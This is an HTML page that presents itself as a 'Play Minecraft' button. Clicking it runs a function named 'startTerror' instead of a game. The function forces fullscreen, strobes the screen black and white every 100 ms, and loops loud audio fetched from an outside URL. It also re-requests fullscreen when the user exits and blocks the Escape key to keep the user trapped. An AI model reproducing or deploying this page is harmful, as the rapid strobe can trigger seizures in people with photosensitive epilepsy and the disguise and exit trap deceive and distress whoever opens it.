<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click to Play</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: black;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            user-select: none;
        }
        #playBtn {
            padding: 30px 80px;
            font-size: 48px;
            font-weight: bold;
            border: 4px solid white;
            background: transparent;
            color: white;
            cursor: pointer;
            border-radius: 20px;
            transition: 0.15s;
            letter-spacing: 4px;
            z-index: 10;
        }
        #playBtn:hover {
            background: white;
            color: black;
            transform: scale(1.05);
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 999;
        }
    </style>
</head>
<body>

    <button id="playBtn">Play Minecraft</button>
    <div id="overlay"></div>

    <script>
        (function() {
            const btn = document.getElementById('playBtn');
            const overlay = document.getElementById('overlay');
            let audio = null;
            let colorInterval = null;
            let audioInterval = null;
            let isPlaying = false;

            // Pre-create audio
            audio = new Audio('https://www.image2url.com/r2/default/audio/1781189273445-63fdf56a-4b63-4e73-a0a3-7b11d2754bf5.mp3');
            audio.preload = 'auto';
            audio.loop = false; // we'll handle looping manually
            audio.volume = 1.0;

            function startTerror() {
                if (isPlaying) return;
                isPlaying = true;

                // Hide button
                btn.style.display = 'none';

                // Show overlay
                overlay.style.display = 'block';

                // 1. Fullscreen
                try {
                    if (document.documentElement.requestFullscreen) {
                        document.documentElement.requestFullscreen();
                    } else if (document.documentElement.webkitRequestFullscreen) {
                        document.documentElement.webkitRequestFullscreen();
                    } else if (document.documentElement.msRequestFullscreen) {
                        document.documentElement.msRequestFullscreen();
                    }
                } catch(e) {}

                // 2. Strobe background black/white every 0.1s
                let flashState = false;
                colorInterval = setInterval(() => {
                    flashState = !flashState;
                    overlay.style.backgroundColor = flashState ? 'white' : 'black';
                }, 100);

                // 3. Play audio nonstop (retrigger on end)
                function playLoop() {
                    if (!isPlaying) return;
                    audio.currentTime = 0;
                    audio.play().catch(() => {});
                }

                // Start first play
                playLoop();

                // Re-trigger every time the audio ends
                audio.addEventListener('ended', playLoop);

                // Also a safety interval to ensure it keeps playing
                audioInterval = setInterval(() => {
                    if (audio.paused && isPlaying) {
                        audio.currentTime = 0;
                        audio.play().catch(() => {});
                    }
                }, 500);
            }

            btn.addEventListener('click', startTerror);

            // Prevent exiting fullscreen easily (re-request fullscreen on exit)
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement && isPlaying) {
                    try {
                        document.documentElement.requestFullscreen();
                    } catch(e) {}
                }
            });
            document.addEventListener('webkitfullscreenchange', () => {
                if (!document.webkitFullscreenElement && isPlaying) {
                    try {
                        document.documentElement.webkitRequestFullscreen();
                    } catch(e) {}
                }
            });

            // Trap escape key — prevent easy exit
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && isPlaying) {
                    e.preventDefault();
                    // Re-request fullscreen
                    try {
                        if (document.documentElement.requestFullscreen) {
                            document.documentElement.requestFullscreen();
                        } else if (document.documentElement.webkitRequestFullscreen) {
                            document.documentElement.webkitRequestFullscreen();
                        }
                    } catch(ex) {}
                }
            });

            // Cleanup on page unload just in case
            window.addEventListener('beforeunload', () => {
                if (colorInterval) clearInterval(colorInterval);
                if (audioInterval) clearInterval(audioInterval);
                if (audio) {
                    audio.pause();
                    audio.src = '';
                }
                isPlaying = false;
            });

        })();
    </script>

</body>
</html>
